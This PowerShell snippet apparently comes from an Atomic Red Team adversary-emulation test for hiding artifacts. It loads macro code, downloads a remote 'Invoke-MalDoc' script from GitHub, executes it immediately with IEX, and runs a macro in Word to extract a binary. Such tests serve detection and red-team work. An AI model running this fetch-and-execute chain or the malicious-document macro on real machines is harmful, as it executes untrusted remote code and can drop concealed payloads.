$macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt")
$macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap